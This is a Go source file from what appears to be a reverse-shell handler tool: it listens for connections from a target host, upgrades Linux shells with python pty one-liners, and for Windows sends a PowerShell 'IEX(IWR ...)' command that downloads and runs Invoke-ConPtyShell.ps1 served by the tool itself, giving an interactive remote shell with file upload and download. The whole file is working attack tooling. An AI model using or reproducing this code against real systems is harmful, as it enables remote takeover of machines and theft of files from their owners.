package terminal

import (
	"bytes"
	"fmt"
	"io"
	"log"
	utils "nc-shell/src/utils"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	rice "github.com/GeertJohan/go.rice"
	"golang.org/x/net/netutil"
)

func listenAndAcceptConnection(terminal *Terminal) {
	var err error
	localPort := ":" + strconv.Itoa(terminal.Options.Port)
	terminal.listener, err = net.Listen("tcp", localPort)
	if err != nil {
		log.Fatalln(err)
	}
	terminal.log.Notice("Listening on", localPort)
	terminal.accept()
	terminal.listener.Close()

}
func (terminal *Terminal) accept() {
	var err error
	//for {
	terminal.Con, err = terminal.listener.Accept()
	if err != nil {
		log.Fatalln(err)
	}
	terminal.log.Notice("Connect from", terminal.Con.RemoteAddr())

}

func (terminal *Terminal) serveHTTPRevShellPowershell() {

	listener, _ := net.Listen("tcp", terminal.Con.LocalAddr().String())
	var svc = http.Server{
		Handler: http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
			templateBox, err := rice.FindBox("../static/")
			if err != nil {
				log.Fatal(err)
			}
			// get file contents as string
			file, _ := templateBox.Open("Invoke-ConPtyShell.ps1")
			if err != nil {
				log.Fatal(err)
			}
			if err != nil {
				log.Fatal(err)
			}
			//rice.MustFindBox("./static/Invoke-ConPtyShell.ps1").HTTPBox()
			http.ServeContent(rw, r, "Invoke-ConPtyShell.ps1", time.Now(), file)
			terminal.log.Debug("Invoke-ConPtyShell.ps1 have been served")
			//http.ServeFile(rw, r, ./static/Invoke-ConPtyShell.ps1)
			listener.Close()

		}),
	}
	listener = netutil.LimitListener(listener, int(1))
	svc.Serve(listener)

}

func (terminal *Terminal) setSpawnTTY() {
	terminal.getTerminalSize()
	sttySize := "stty rows " + terminal.rows + " cols " + terminal.cols
	terminal.spawnTTY = `/usr/bin/env python2.7 -c 'import pty; pty.spawn(["/bin/bash","-c"," ` + sttySize + `  ;bash"])'
/usr/bin/env python -c 'import pty; pty.spawn(["/bin/bash","-c"," ` + sttySize + `  ;bash"])
/usr/bin/env python3 -c 'import pty; pty.spawn(["/bin/bash","-c"," ` + sttySize + `  ;bash"])
`
}

func (terminal *Terminal) getTerminalSize() {
	cmd := exec.Command("stty", "size")
	cmd.Stdin = os.Stdin
	sizeByte, err := cmd.Output()
	size := string(sizeByte)
	size = strings.TrimSuffix(size, "\n")
	if err != nil {
		log.Fatal(err)
	}
	terminal.rows = strings.Split(size, " ")[0]
	terminal.cols = strings.Split(size, " ")[1]

}

//Mettre dans utils network
func (terminal *Terminal) sendStringToStream(str string) []byte {
	terminal.log.Debug("Send string : " + str + " to stream")
	buf := []byte(str)
	bufRead := make([]byte, 10240)
	_, err := terminal.Con.Write(buf)

	if err != nil {
		terminal.log.Fatal("Write error: %s\n", err)
	}
	// Wait to catch the noisy output
	time.Sleep(500 * time.Millisecond)
	// Force to stop to read. Useful for windows reverse connection with ConPTY
	terminal.Con.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	terminal.Con.Read(bufRead)
	fmt.Println(string(bufRead))
	// Send new line to show the prompt
	terminal.Con.Write([]byte("\n"))
	// Disable timeout for further read
	terminal.Con.SetReadDeadline(time.Time{})
	return bufRead
}

// Performs copy operation between streams: os and tcp streams
func (terminal *Terminal) streamCopy(src io.Reader, dst io.Writer, toRemote bool) <-chan int {
	syncChannel := make(chan int)
	var command string
	go func() {
		defer func() {
			if con, ok := dst.(net.Conn); ok {
				con.Close()
				terminal.log.Debugf("Connection from %v is closed\n", con.RemoteAddr())
			}
			syncChannel <- 0 // Notify that processing is finished
		}()
		for {
			var nBytes int
			var err error
			buf := make([]byte, 1024)
			nBytes, err = src.Read(buf)
			if err != nil {
				if err != io.EOF {
					terminal.log.Criticalf("Read error: %s\n", err)

				}
				break
			}
			//if writing stdin -> target
			if toRemote {
				// Remove null byte and line feed (\x10) which was send sometimes between each character
				command += string(bytes.Trim(bytes.Trim(buf, string(utils.Nullbyte)), string(utils.Newline)))
				//Contains new line
				if utils.SliceByteContains(buf, byte(13)) {
					terminal.mutex.Lock()
					command = strings.TrimSpace(command)
					terminal.log.Debug("Command contains new line: " + command)
					firstKeyWord := strings.Split(command, " ")[0]
					commandSplit := strings.Split(command, " ")
					switch firstKeyWord {
					case "upload":
						terminal.log.Debug("Custom command upload")
						//fmt.Println("upload")
						terminal.Upload(command)
						//skip the command
						nBytes = 0

					case "download":
						terminal.log.Debug("Custom command download")
						terminal.Download(commandSplit[1])
						//skip the command
						nBytes = 0
						dst.Write(bytes.Repeat(utils.Backspace, len(command)))

					case "EXIT":
						terminal.log.Debug("Custom command EXIT")
						terminal.mutex.Unlock()
						return

					}
					terminal.mutex.Unlock()
					command = ""
				}
			}

			// If write target -> stdout
			if !toRemote {
				// Using mutex to avoid writing stdout of the target while we are typing
				terminal.mutex.Lock()
				_, err = dst.Write(buf[0:nBytes])
				terminal.mutex.Unlock()
			} else {
				_, err = dst.Write(buf[0:nBytes])
			}
			if err != nil {
				terminal.log.Critical("Write error: %s\n", err)

			}

		}

	}()
	return syncChannel
}

func (terminal *Terminal) execute(cmd string) []byte {

	terminal.log.Debug("Execute command: " + cmd)
	bufRead := make([]byte, 10240)
	_, err := terminal.Con.Write([]byte(cmd + "\n"))
	if err != nil {
		terminal.log.Fatalf("Write error: %s\n", err)
	}
	// Wait to catch the noisy output
	time.Sleep(500 * time.Millisecond)
	// Force to stop to read. Useful for windows reverse connection with ConPTY
	terminal.Con.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	// Catch it to not hide it
	terminal.Con.Read(bufRead)
	terminal.log.Debug("Output of the command: " + string(bufRead))
	// Send new line to show the prompt
	terminal.Con.Write([]byte("\n"))

	// Disable timeout for further read
	terminal.Con.SetReadDeadline(time.Time{})
	return bufRead
}

func (terminal *Terminal) cleanCmd(cmd string) {
	//Remove all the character which has been sent (for example if someone send upload xxxxx we don't want to execute this command on the remote terminal). All the bytes are sent when they are press on the keyboard (we need this for using tab and arrow up key)
	terminal.execute(string(bytes.Repeat(utils.Backspace, len(cmd))))
	terminal.execute(string(utils.Newline))
}

func (terminal *Terminal) sttyRawEcho(state string) {
	if state == "enable" {
		terminal.log.Debug("Execute stty raw -echo")
		rawMode := exec.Command("/bin/stty", "raw", "-echo")
		rawMode.Stdin = os.Stdin
		_ = rawMode.Run()
		rawMode.Wait()

	} else if state == "disable" {

		terminal.log.Debug("Execute stty raw")
		rawModeOff := exec.Command("/bin/stty", "-raw")
		rawModeOff.Stdin = os.Stdin
		_ = rawModeOff.Run()
		rawModeOff.Wait()

	}
}

func (terminal *Terminal) interactiveReverseShellLinux() {
	//terminal.send_string_to_stream(terminal.spawnTTY)
	terminal.execute(terminal.spawnTTY)

}

func (terminal *Terminal) interactiveReverseShellWindows() {
	terminal.getTerminalSize()
	command := `powershell IEX(IWR http://` + terminal.Con.LocalAddr().String() + ` -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
	terminal.log.Debug("Send the command: " + command)
	terminal.execute(command)
	terminal.Con.Close()
}
